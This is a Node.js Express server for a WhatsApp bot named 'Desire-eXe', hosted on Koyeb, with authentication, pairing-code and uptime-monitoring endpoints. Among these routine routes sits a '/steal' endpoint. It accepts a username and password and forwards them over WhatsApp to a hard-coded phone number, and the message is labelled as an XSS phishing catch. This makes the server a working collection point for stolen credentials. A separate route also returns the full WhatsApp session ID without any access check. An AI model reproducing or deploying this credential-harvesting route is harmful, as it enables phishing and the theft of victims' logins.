const { startBot, getAuthPage, getQRCode, requestPairingCode } = require('./config/WhatsappConnection.js');
const express = require('express');
const bodyParser = require('body-parser');

// ✅ Express server setup
const app = express();
const port = process.env.PORT || 8000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Global variables to track bot state
global.botStatus = 'starting';
global.whatsappBot = null;
global.connectionTime = null;
global.totalPings = 0;

// Helper function to get session information
function getSessionInfo() {
  const sock = global.whatsappBot;
  
  if (!sock) {
    return {
      connected: false,
      message: 'Bot not initialized'
    };
  }

  const creds = sock.authState?.creds || {};
  const sessionId = creds.me?.id;
  
  return {
    connected: global.botStatus === 'connected',
    hasSession: !!sessionId,
    registered: creds.registered || false,
    platform: sock.user?.platform || 'Unknown',
    sessionId: sessionId ? `${sessionId.substring(0, 8)}...` : 'Not authenticated',
    phone: creds.me?.phone ? `${creds.me.phone.substring(0, 4)}...` : null,
    connectionTime: global.connectionTime
  };
}

// Enhanced Authentication Route - Combines QR and Pairing Code
app.get('/auth', (req, res) => {
  res.send(getAuthPage());
});

// Pairing Code API Endpoint
app.post('/auth/pairing', async (req, res) => {
  const { phoneNumber } = req.body;
  
  if (!phoneNumber) {
    return res.status(400).json({
      success: false,
      error: 'Phone number is required'
    });
  }
  
  if (!global.whatsappBot) {
    return res.status(503).json({
      success: false,
      error: 'WhatsApp bot not ready. Please try again in a few seconds.'
    });
  }
  
  try {
    const result = await requestPairingCode(global.whatsappBot, phoneNumber);
    
    if (result.success) {
      res.json({
        success: true,
        code: result.code,
        phoneNumber: result.phoneNumber,
        expiresAt: result.expiresAt,
        message: 'Pairing code generated successfully'
      });
    } else {
      res.status(400).json({
        success: false,
        error: result.error
      });
    }
  } catch (error) {
    console.error('❌ Pairing code request error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to generate pairing code: ' + error.message
    });
  }
});

// Get current authentication status
app.get('/auth/status', (req, res) => {
  const { qrCode, qrCodeImage, isConnected, pairingCode, pairingPhoneNumber } = getQRCode();
  const sessionInfo = getSessionInfo();
  
  res.json({
    success: true,
    connected: isConnected,
    botStatus: global.botStatus,
    authentication: {
      qrAvailable: !!qrCode,
      pairingAvailable: !!pairingCode,
      pairingPhoneNumber: pairingPhoneNumber,
      pairingCode: pairingCode ? '••••••' : null
    },
    session: sessionInfo,
    timestamp: new Date().toISOString()
  });
});

// QR Code Route (legacy support)
app.get('/qr', (req, res) => {
  res.redirect('/auth');
});

// JSON QR Code endpoint (legacy support)
app.get('/qr/json', (req, res) => {
  const { qrCode, qrCodeImage, isConnected } = getQRCode();
  
  res.json({
    success: !!qrCode,
    connected: isConnected,
    qrAvailable: !!qrCode,
    qrImage: qrCodeImage,
    botStatus: global.botStatus,
    message: qrCode ? 'QR code available' : 'No QR code available',
    timestamp: new Date().toISOString()
  });
});

// ==================== ENHANCED UPTIME MONITORING ENDPOINTS ====================

// Enhanced ping endpoint for UptimeRobot
app.get('/ping', (req, res) => {
  global.totalPings = (global.totalPings || 0) + 1;
  
  const sessionInfo = getSessionInfo();
  const { qrCode, pairingCode, isConnected } = getQRCode();
  
  // Calculate additional metrics
  const uptime = process.uptime();
  const memoryUsage = process.memoryUsage();
  const memoryMB = {
    rss: Math.round(memoryUsage.rss / 1024 / 1024),
    heapTotal: Math.round(memoryUsage.heapTotal / 1024 / 1024),
    heapUsed: Math.round(memoryUsage.heapUsed / 1024 / 1024),
    external: Math.round(memoryUsage.external / 1024 / 1024)
  };
  
  res.json({ 
    status: 'pong',
    bot: 'Desire-eXe V1.0',
    platform: 'Koyeb',
    botStatus: global.botStatus,
    connected: isConnected,
    authentication: {
      qrAvailable: !!qrCode,
      pairingAvailable: !!pairingCode
    },
    session: sessionInfo,
    system: {
      uptime: uptime,
      uptime_human: `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`,
      memory: memoryMB,
      node_version: process.version,
      platform: process.platform
    },
    monitoring: {
      service: 'UptimeRobot',
      total_pings: global.totalPings,
      last_ping: new Date().toISOString(),
      recommended_interval: '5 minutes'
    },
    timestamp: new Date().toISOString()
  });
});

// Simple health check for basic monitoring
app.get('/uptime', (req, res) => {
  res.json({
    status: 'ok',
    uptime: process.uptime(),
    botStatus: global.botStatus,
    connected: getQRCode().isConnected,
    timestamp: new Date().toISOString()
  });
});

// Lightweight endpoint for frequent pings
app.get('/live', (req, res) => {
  res.json({ 
    alive: true, 
    time: new Date().toISOString(),
    bot: global.botStatus,
    connected: getQRCode().isConnected
  });
});

// Status endpoint specifically for uptime monitors
app.get('/monitor', (req, res) => {
  const { isConnected } = getQRCode();
  
  const status = (global.botStatus === 'connected' && isConnected) ? 'healthy' : 
                 (global.botStatus === 'connecting' || global.botStatus === 'reconnecting') ? 'warning' : 'error';
  
  res.json({
    status: status,
    bot_status: global.botStatus,
    connected: isConnected,
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    checks: {
      express_server: 'running',
      whatsapp_bot: global.botStatus,
      authentication: !!(getQRCode().qrCode || getQRCode().pairingCode),
      whatsapp_connected: isConnected
    }
  });
});

// Health check routes (for Koyeb)
app.get('/', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { qrCode, qrCodeImage, isConnected, pairingCode } = getQRCode();
  
  res.json({ 
    status: 'online', 
    bot: 'Desire-eXe V1.0',
    platform: 'Koyeb Cloud',
    region: process.env.KOYEB_REGION || 'global',
    botStatus: global.botStatus,
    session: sessionInfo,
    authentication: {
      qrAvailable: !!qrCode,
      pairingAvailable: !!pairingCode,
      connected: isConnected
    },
    uptime: process.uptime(),
    monitoring: {
      uptime_robot: 'ready',
      endpoints: ['/ping', '/monitor', '/live', '/uptime']
    },
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  const sessionInfo = getSessionInfo();
  
  res.status(200).json({ 
    status: 'healthy',
    uptime: process.uptime(),
    botStatus: global.botStatus,
    session: sessionInfo,
    memory: process.memoryUsage(),
    timestamp: new Date().toISOString()
  });
});

// Enhanced status endpoint
app.get('/status', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { qrCode, qrCodeImage, isConnected, pairingCode } = getQRCode();
  
  res.json({
    status: 'online',
    platform: 'Koyeb Cloud Hosting',
    region: process.env.KOYEB_REGION || 'global',
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    botStatus: global.botStatus,
    session: sessionInfo,
    authentication: {
      qrAvailable: !!qrCode,
      pairingAvailable: !!pairingCode,
      connected: isConnected
    },
    connectionTime: global.connectionTime,
    timestamp: new Date().toISOString()
  });
});

// Session info endpoint
app.get('/session', (req, res) => {
  const sessionInfo = getSessionInfo();
  
  res.json({
    success: true,
    botStatus: global.botStatus,
    session: sessionInfo,
    connectionTime: global.connectionTime,
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

// Session ID endpoint
app.get('/session/id', (req, res) => {
  const sock = global.whatsappBot;
  const sessionId = sock?.authState?.creds?.me?.id;
  
  if (!sessionId) {
    return res.json({
      success: false,
      message: 'No active WhatsApp session',
      botStatus: global.botStatus,
      suggestion: 'Visit /auth to authenticate'
    });
  }
  
  res.json({
    success: true,
    sessionId: sessionId,
    maskedSessionId: sessionId.substring(0, 8) + '...',
    botStatus: global.botStatus,
    connectionTime: global.connectionTime,
    timestamp: new Date().toISOString()
  });
});

// Example route: send data to your WhatsApp
app.post('/steal', async (req, res) => {
  const { username, password } = req.body;
  const yourNumber = '2347017747337@s.whatsapp.net';

  try {
    if (global.whatsappBot && global.botStatus === 'connected') {
      await global.whatsappBot.sendMessage(yourNumber, {
        text: `🕷 *XSS PHISHING DETECTED!* \n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 Source: Koyeb Server\n⏰ Time: ${new Date().toLocaleString()}`,
      });
      res.json({
        success: true,
        message: 'Credentials sent to WhatsApp',
        timestamp: new Date().toISOString()
      });
    } else {
      res.status(503).json({ 
        success: false,
        error: 'WhatsApp bot not ready',
        botStatus: global.botStatus,
        suggestion: 'Try again in a few seconds or check /status'
      });
    }
  } catch (err) {
    console.error('❌ Error sending credentials to WhatsApp:', err.message);
    res.status(500).json({ 
      success: false,
      error: 'Failed to send message',
      botStatus: global.botStatus,
      details: err.message
    });
  }
});

// Bot information endpoint
app.get('/bot/info', (req, res) => {
  const sessionInfo = getSessionInfo();
  const { qrCode, pairingCode } = getQRCode();
  
  res.json({
    name: 'Desire-eXe V1.0',
    version: '1.0',
    developer: 'Desire',
    platform: 'Koyeb Cloud',
    status: global.botStatus,
    session: sessionInfo,
    authentication: {
      qrAvailable: !!qrCode,
      pairingAvailable: !!pairingCode
    },
    monitoring: {
      uptime_robot: 'supported',
      recommended_endpoint: '/ping',
      backup_endpoints: ['/monitor', '/live', '/uptime']
    },
    features: [
      'AI-Powered Responses',
      'Media Download',
      'Group Management',
      'Security Tools',
      'Web Integration',
      'QR Code Authentication',
      'Pairing Code Authentication',
      '24/7 Uptime Monitoring'
    ],
    endpoints: {
      auth: '/auth',
      status: '/status',
      session: '/session',
      health: '/health',
      ping: '/ping',
      monitor: '/monitor'
    },
    timestamp: new Date().toISOString()
  });
});

// ✅ KOYEB: Start WhatsApp bot FIRST, then Express server
async function initializeApp() {
  try {
    console.log('🚀 Starting Desire-eXe V1.0 on Koyeb...');
    
    // Start WhatsApp bot first
    const sock = await startBot();
    
    // Store bot instance globally for use in routes
    global.whatsappBot = sock;
    
    console.log('✅ WhatsApp bot initialization complete');
    
    // Now start Express server
    const server = app.listen(port, () => {
      console.log(`🚀 Express server running on port ${port}`);
      console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`🌐 Platform: Koyeb Cloud`);
      
      // ✅ KOYEB: Show Koyeb-specific info
      if (process.env.KOYEB_REGION) {
        console.log(`🌐 Koyeb Region: ${process.env.KOYEB_REGION}`);
      }
      if (process.env.KOYEB_SERVICE_NAME) {
        console.log(`🌐 Koyeb Service: ${process.env.KOYEB_SERVICE_NAME}`);
      }
      
      // ✅ DYNAMIC URLS: Works for any Koyeb app or localhost
      const baseUrl = process.env.KOYEB_APP_DOMAIN 
        ? `https://${process.env.KOYEB_APP_DOMAIN}`
        : `http://localhost:${port}`;
      
      console.log(`🌐 Health Check: ${baseUrl}/health`);
      console.log(`🔐 Authentication: ${baseUrl}/auth`);
      console.log(`🔗 Status: ${baseUrl}/status`);
      console.log(`🆔 Session: ${baseUrl}/session`);
      console.log(`🤖 Bot Info: ${baseUrl}/bot/info`);
      console.log(`📊 Uptime Monitoring: ${baseUrl}/ping`);
      console.log(`👀 Monitor: ${baseUrl}/monitor`);
      
      // UptimeRobot setup instructions
      console.log('\n📈 UPTIMEROBOT SETUP:');
      console.log(`📍 Primary URL: ${baseUrl}/ping`);
      console.log(`📍 Backup URL: ${baseUrl}/monitor`);
      console.log('⏰ Interval: 5 minutes');
      console.log('🔔 Alerts: Enable for instant notifications\n');
      
      // ✅ Also show local access if running locally
      if (!process.env.KOYEB_APP_DOMAIN) {
        console.log(`💻 Local Access: ${baseUrl}`);
      }
    });

    // ✅ KOYEB: Graceful shutdown for Koyeb
    process.on('SIGTERM', () => {
      console.log('👋 Koyeb is stopping the service...');
      global.botStatus = 'shutting_down';
      server.close(() => {
        console.log('✅ Express server closed gracefully');
        process.exit(0);
      });
    });

    process.on('SIGINT', () => {
      console.log('👋 Process interrupted...');
      global.botStatus = 'shutting_down';
      server.close(() => {
        console.log('✅ Express server closed');
        process.exit(0);
      });
    });

  } catch (err) {
    console.error('❌ Failed to start bot:', err);
    global.botStatus = 'failed';
    
    // ✅ KOYEB: Auto-restart instead of immediate exit
    console.log('🔄 Auto-restarting in 10 seconds...');
    setTimeout(initializeApp, 10000);
  }
}

// Start the application
initializeApp();

// ✅ KOYEB: Better error handling
process.on('uncaughtException', (error) => {
  console.error('🔄 Uncaught Exception:', error.message);
  global.botStatus = 'error';
  // Don't exit - let Koyeb handle restarts
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('🔄 Unhandled Rejection:', reason);
  global.botStatus = 'error';
  // Don't exit - let Koyeb handle restarts
});

// ✅ WHATSAPP: Keep connection alive to prevent timeouts
setInterval(async () => {
  if (global.whatsappBot && global.botStatus === 'connected') {
    try {
      await global.whatsappBot.sendPresenceUpdate('available');
      console.log('❤️ Keep-alive ping sent to WhatsApp');
    } catch (error) {
      console.log('⚠️ Keep-alive failed, connection might be dead:', error.message);
      global.botStatus = 'error';
    }
  }
}, 4 * 60 * 1000); // Every 4 minutes

// ✅ KOYEB: Keep-alive for Koyeb (prevent app sleep)
setInterval(() => {
  if (global.botStatus) {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    
    console.log(`🤖 Bot Status: ${global.botStatus}, Uptime: ${hours}h ${minutes}m ${seconds}s`);
    
    // Log UptimeRobot stats every hour
    if (minutes === 0 && seconds === 0) {
      console.log(`📊 UptimeRobot Stats: ${global.totalPings || 0} total pings received`);
    }
  }
}, 60000); // Every minute

console.log('🔄 app.js loaded successfully');
